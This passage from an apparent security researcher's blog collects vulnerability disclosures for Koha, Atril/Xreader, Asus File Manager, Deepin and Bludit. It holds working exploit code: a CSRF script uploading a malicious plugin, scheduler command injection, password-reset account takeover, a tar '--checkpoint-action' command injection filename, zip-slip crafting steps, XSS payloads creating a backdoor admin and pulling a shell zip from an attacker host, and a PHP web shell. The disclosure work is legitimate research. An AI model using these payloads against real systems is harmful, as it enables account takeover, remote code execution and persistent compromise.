  for (var i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ia], {
    type: mimeString
  });
}

var dataUri = "data:application/zip;base64,UEsDBAoAAAAAAHpk91YAAAAAAAAAAAAAAAAFABwAS29oYS9VVAkAA1DRvGSM0bxkdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAAJVI+FYAAAAAAAAAAAAAAAAMABwAS29oYS9QbHVnaW4vVVQJAANS8b1kXPG9ZHV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAD2s/RWAAAAAAAAAAAAAAAAEAAcAEtvaGEvUGx1Z2luL1JjZS9VVAkAA3douWQyMr1kdXgLAAEEAAAAAAQAAAAAUEsDBBQAAAAIAJVI+FbYjsVGowEAAEYDAAASABwAS29oYS9QbHVnaW4vUmNlLnBtVVQJAANR8b1kMjK9ZHV4CwABBAAAAAAEAAAAAJVRXWvcMBB8169YzEEukFx8CX2Iy4XSkkIpbcMV8irW9t5ZjSU5+mh6lPz3rnxyc0nzUmEse3Z2d2ZXDNjc4Zbgs+2wqm76uFWmqtYNvRUieoIvtiXHyA25PkM18uv+YX6Y4qvqPcPHTLHRwez2ev3907evsIKiXCyLCdYUsMWAjP8WwMegJjg4qys44uZHJ2MUY+isex79SLUyOc6lSO5J1Ob4eXm+PC0vTsvLQ1Ic0tXmIsUTqdiTtDJKRy1/kvPKmrHS8nJRvlmUJT9lrqXx10taNC1t9tEJPZA7DSJLId84NYSJlLqETnkYxiECf60/XHOvRx6Y3/lAel48dBa1ujoLejgj0/A+ijRmseoI2wuoacPupSfTSk3e8zK9EPutQGftHYQOA7hoPDi17ULOYJggJ8B9pEip/eBswxi1grPzz1RWjqzF0HPvJgaW4GP9av+8XL2DOcw89ZsTmA3oUHs45tW/k6w/EV6ziFoq6awNyeXjX5uNs+aHraVJFvrdc4dsziizhTQc2DirAccE4IxJbNL6osg/Mv9fnRBLZv8BUEsBAh4DCgAAAAAAemT3VgAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAEtvaGEvVVQFAANQ0bxkdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAlUj4VgAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BPwAAAEtvaGEvUGx1Z2luL1VUBQADUvG9ZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAPaz9FYAAAAAAAAAAAAAAAAQABgAAAAAAAAAEADtQYUAAABLb2hhL1BsdWdpbi9SY2UvVVQFAAN3aLlkdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAlUj4VtiOxUajAQAARgMAABIAGAAAAAAAAQAAAO2BzwAAAEtvaGEvUGx1Z2luL1JjZS5wbVVUBQADUfG9ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAABAAEAEsBAAC+AgAAAAA=";

var blob = dataURItoBlob(dataUri);

         var formData = new FormData(),
          request  = new XMLHttpRequest();
          request.withCredentials = true;

    /** Configure the request */
    request.open( "POST", "http://library.kali.local:8001/cgi-bin/koha/plugins/plugins-upload.pl", true );

    formData.append( "uploadfile", blob, "feb.kpz" );
    formData.append("op","Upload");
    request.send(formData);
   }

csrf_to_rce();
fetct("/cgi-bin/koha/plugins/plugins-enable.pl?class=Koha::Plugin::Rce&method=enable"); //Plugin Enable

```
----------------------------------------------------------------

This above Javascript code will directly upload plugin without Account takeover.
The plugin will execute whoami command and stores it's output to /tmp/encode

3. I have created working JS code for Command Injection and Account takeover as well

rce.js:

-----------------------------------------------------------
```
fetch("/cgi-bin/koha/tools/scheduler.pl").then(response => response.text()).then((response) => {
window.server_time = response.match(/([0-9]{2}:[0-9]{2})/)[1];

var cmd = "whoami >/tmp/xss_sh";
var b64cmd = encodeURIComponent(btoa(cmd));
var inject = "echo+"+b64cmd+"|base64+-d|bash"
var hour = server_time.split(":")[0];
var min = server_time.split(":")[1];

if (Number(min)+2 > 60){
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = String(Number(hour)+1)

fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
} else {
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = hour
fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
}
 }).catch(err => console.log(err))

```
-----------------------------------------------------------

This above code will fetch server time from the target and schedules a task(server time + 2 minutes) with the arbitrary injected command.

xsrf_ato.js (Account takeover):

-------------------------------------------------------------
```
fetch("/cgi-bin/koha/members/member-password.pl?member=1").then(response => response.text()).then((response) => {window.csrf_token = response.match(/value=\"(.{92})\"/)[1];
const xhr = new XMLHttpRequest();
xhr.open("POST","/cgi-bin/koha/members/member-password.pl",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("destination=&borrowernumber=1&member=1&newuserid=admin&newpassword=Koha@pwn1234&newpassword2=Koha@pwn1234&csrf_token="+csrf_token);
}).catch(err => console.log(err))

```
-------------------------------------------------------------

This above JS will steal the CSRF token and performs a password reset. It sets admin:Koha@pwn1234 as Admin Staff credentials.

Thanks for reading,
Febin

```

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/#respond)

**Zip Path traversal(ZipSlip) to arbitrary file write/overwrite in Asus default Android FileManager affecting all Asus Smartphones.**

This vulnerability is found in the latest version of the default file manager of Asus smartphones which comes pre-installed with the devices and also can’t be uninstalled. An attacker can create a crafted zip archive with path traversal to write/overwrite files in arbitrary locations on the target Smartphone. This vulnerability is dangerous as this can be abused to overwrite targetted files on the victim device or overwrite files that have patterns in the filenames like the photos taken from the camera, WhatsApp audio messages, WhatsApp Voice notes, Telegram Files, and much more. Also, Asus FileManager doesn’t prompt user confirmation before overwriting existing files which makes it easier for an attacker to exploit the vulnerability to overwrite existing files on the victim’s device.

**Severity**: *HIGH*

Affected Software and Version: Asus File Manager(com.asus.filemanager) <= 2.8.0.85\_230220 latest

**Proof-Of-Concept:**

1. Craft a path-traversal zip archive (here I created it on my Linux machine)

`$ echo PWNED > 001001001001001sdcard1poc1pwn.txt`

`$ zip trav.zip 001001001001001sdcard1poc1pwn.txt`

`$ sed -i s/"0"/"."/g trav.zip`

`$ sed -i s/"1"/"\/"/g trav.zip`

2. Transfer the zip file (trav.zip) to the Asus or Tecno device.
3. Open the archive and extract it with the default file manager
4. You will be able to see a file named pwn.txt under /sdcard/poc/pwn.txt

**Tested Devices:**

Asus Rog phone 5 and other devices with Asus Filemanager installed

# [CVE-2023-50255: Critical RCE Vulnerability in Deepin Linux’s default Archiver.](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/#respond)

## Zip Path Traversal (ZipSlip) in Deepin-Compressor

This is my 7th Published CVE.

## Description

Deepin-Compressor is the default archive manager of Deepin Linux OS. A path traversal vulnerability in deepin-compressor can be exploited to achieve Remote Command Execution on the target system upon opening crafted archives.

### Details

While decompressing/extracting zip archives, deepin-compressor is not validating the file names. Adding one or more “../” as prefixes to the filenames will lead to path traversal. This leads to arbitrary file write and RCE.

### PoC

Steps to create such zip archive:

1. Create a file for traversal

```

echo "TEST" > XXYXXYXXYtmpYpoc.txt

```

2. Make a normal zip archive

```

zip poc.zip XXYXXYXXYtmpYpoc.txt

```

3. Craft malicious archive

```

sed -i s/"XXY"/"..\/"/g poc.zip
sed -i s/"tmpY"/"tmp\/"/g poc.zip

```

By following the above steps, you can create a malicious zip archive, upon extracting that archive, a file named poc.txt will be created under /tmp directory

### Impact

Remote Command Execution: By exploiting the vulnerability an attacker can place malicious desktop entries under ~/.config/autostart to achieve RCE on the target

**Fix**: If you’re using Deepin Linux, update deepin-compressor to the latest version 5.12.21

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

Deepin Linux’s default document reader “**deepin-reader**” software ***<** **6.0.7***suffers from a serious vulnerability due to a design flaw that leads to Remote Command Execution via crafted docx document.

### Details

Deepin-reader is the default document reader for the Operating System Deepin Linux. The deepin-reader performs some shell command operations while dealing with docx document format.

1. When opening a docx document, deepin-reader creates a temporary directory under /tmp and place the docx document under the directory
2. Then deepin-reader calls the “unzip” shell command to extract the docx file
3. After the extraction process, deepin-reader calls “pandoc” command to convert the docx file to an HTML file named “temp.html” under word/ directory (created when the docx file is extracted with unzip).
   The command will look something like this, “pandoc temp.docx -o word/temp.html
4. Then deepin-reader will try to convert that HTML file to PDF and open the pdf.

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2023/12/image.png?w=1024)

This happens when we open a docx file in Deepin Linux OS.

This behavior can be exploited by placing a symlink named word/temp.html inside a crafted malicious docx pointing to any file inside the target system.

So, while opening the docx file, pandoc will write to the system file that the symlink word/temp.html is pointing to.

This is a File overwrite vulnerability.
A Remote Code Execution can be achieved by overwriting files like .bashrc, .bash\_login etc. Rce will be triggered when the user opens the terminal.

We can force pandoc to write/overwrite files(.bashrc) in the right format to execute arbitrary commands.

**Advisory:** <https://github.com/linuxdeepin/developer-center/security/advisories/GHSA-q9jr-726g-9495>

Update Deepin Linux and deepin-reader to the latest version.

**Download the PoC exploit**: [https://github.com/febinrev/deepin-linux\_reader\_RCE-exploit/](https://github.com/febinrev/deepin-linux_reader_RCE-exploit/tree/main)

# [Stored-XSS to Admin Account Takeover/RCE in Bludit CMS [CRITICAL]](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/)

[6th October 20232nd November 2023](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/10/06/stored-xss-to-admin-account-takeover-rce-critical/#respond)

### Description

There’s a Stored/Persistent Cross-Site Scripting vulnerability in Bludit CMS below 3.15.0 that allows a blog Author(or an attacker with Author user privileges) to create a backdoor Administrator user and even achieve Remote Code Execution on the system. This exploit happens because of the fact that Bludit is not sanitizing any dangerous javascript that’s being injected inside page contents by the Author user, even though the cookie has “httpOnly” flag and the app has a CSRF token in place, this won’t prevent the exploitation.

The attacker (who has Author privs) can carefully craft malicious JS payload that steals Admin’s CSRF token and sends an XHR post request to “/admin/new-user” to create a new Administrator in the background, when the real Admin visits the malicious Blog/Page the JS will get executed in the background. Attacker can then log in to Bludit as the newly created Admin.

Remote Code Execution is achieved by abusing the “Remote Content” plugin. The attacker (who has Author privs) can carefully craft malicious JS payload that steals the Admin’s CSRF token and send XHR Requests in the background that enable “Remote Content” plugin and configure the plugin to download the attacker-controlled malicious zip file from the attacker’s server and also calls the webhook to trigger the plugin. When the real Admin visits the malicious Blog/Page the JS will get executed in the background, now the attacker can simply navigate to “[http://<bludit\_URL>/bl-content/workspaces/remote-content/shell.php&#8221](http://<bludit_URL>/bl-content/workspaces/remote-content/shell.php%26#8221);

![](https://user-images.githubusercontent.com/52229330/254687626-7aee1474-c147-4175-a87a-25d72e44dc2d.png)
### Steps to reproduce the problem

#### Payload1 : Creates another Admin in the background

```
<h2>Hi</h2>

<script>
fetch("/admin/content").then(response => response.text()).then((response) => {

window.tokenCSRF = response.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];  // Steal CSRF token

const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/new-user", true);
xhr.withCredentials = true;

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = () => {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    // Request finished. Do processing here.
  }
};
xhr.send("save=&tokenCSRF="+tokenCSRF+"&new_username=pwn&new_password=pwn123&confirm_password=pwn123&role=admin&email=admin3%40feb.com");  // creating backdoor admin user

}).catch(err => console.log(err))

</script>
```
#### Payload2 : XSS to RCE

```
<h2>Hi Admin</h2>

<script>
fetch("/admin/content").then(response => response.text()).then((response) => {

window.tokenCSRF = response.match(/var\s+tokenCSRF\s*=\s*"(.+)"/)[1];  //Steal CSRF token

// Install Remote Content Plugin
const inst_plugin = new XMLHttpRequest();
inst_plugin.open("GET", "/admin/install-plugin/pluginRemoteContent", true);
inst_plugin.withCredentials = true;
inst_plugin.send()

// Shell upload plugin configue
const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/configure-plugin/pluginRemoteContent", true);
xhr.withCredentials = true;

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = () => {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    // Request finished. Do processing here.
  }
};
xhr.send("save=&tokenCSRF="+tokenCSRF+"&webhook=trigger&source=http://192.168.1.39/shell2.zip");  // creating backdoor shell (replace the http://192.168.1.39/shell2.zip with a your own link to the plugin

// Trigger the exploit by calling the Webhook
const trigger = new XMLHttpRequest();
trigger.open("GET", "/trigger", true);
trigger.withCredentials = true;
trigger.send()

}).catch(err => console.log(err))

</script>
```
#### shell.php:

```
<?php system($_GET["cmd"]); ?>
```

1. Log in as Blog Author
2. Create new content.
3. Intercept the HTTP request using any proxy tool such as BurpSuite, URL-encode the payload1 HTML/JS code, and place it inside the “content” parameter of the POST request like below.

![](https://user-images.githubusercontent.com/52229330/254681795-85759fef-0eb1-43e5-b186-6734fd4b72fb.png)

4. To verify it, Open another private browser window and log in as Admin, then visit the malicious content created by the Author, you will be able to see a new user has been created under the users list.

![](https://user-images.githubusercontent.com/52229330/254683692-06e167e7-fc71-452b-96d0-62e71c79077b.png)
#### REMOTE CODE EXECUTION:

1. In order to achieve Remote Code Execution, we need to first create a malicious plugin and serve it for further exploitation

![](https://user-images.githubusercontent.com/52229330/254685541-e03bd9b6-4161-4f27-bc5f-d52780705122.png)

2. URL-encode the payload2 from above, and make changes according to your own environment, then place it inside the “content” parameter in the HTTP request that’s intercepted

![](https://user-images.githubusercontent.com/52229330/254686113-6f94c33e-ac52-42b2-8972-295c4a1a5d76.png)

3. When the admin visits the malicious blog/page, the attacker will achieve RCE on the system.

Payload triggered:

[![](https://user-images.githubusercontent.com/52229330/254686495-e88d42a4-1e9c-40d9-a01c-0668e4a9f007.png)](https://user-images.githubusercontent.com/52229330/254686495-e88d42a4-1e9c-40d9-a01c-0668e4a9f007.png)

Got Code Execution on target System:

[![](https://user-images.githubusercontent.com/52229330/254687321-ea89c8d6-fe23-4dbf-a9a4-cc3dcbb06a35.png)](https://user-images.githubusercontent.com/52229330/254687321-ea89c8d6-fe23-4dbf-a9a4-cc3dcbb06a35.png)

RCE on the target!

*If you are using Bludit CMS in production update to the newer version with patches,always verify the authors, and only allow author accounts to trusted persons in your organization/team.*

# [Stored XSS in FileBrowser leads to Admin account Takeover + RCE](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/)

[15th September 202318th September 2023](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/09/15/xss-in-filebrowser-leads-to-admin-account-takeover-in-filebrowser/#respond)

**CVE-2023-39612**

### Description

A Cross-Site Scripting vulnerability is discovered in FileBrowser *below v2.25.0* in which an attacker with a non-admin user account inside the FileBrowser instance can create malicious HTML & JS files, craft them in a specific way, and send the HTML file’s link to the Admin to achieve Account takeover via XSS bypassing the Content-Security-Policy.

**Proof-Of-Concept**:

// *xss.js*

```

alert(document.cookie);

```

// *xss.htm*

```

<script src="/api/raw/poc/xss.js?auth=[jwt_token of the Low Privileged user]"></script>

```

1. Create a folder named “poc” as the non-admin user.
2. Create the 2 files as above (xss.htm and xss.js) under the poc folder.
3. Craft the XSS URL as below and open it as the Admin user to verify the XSS.

```

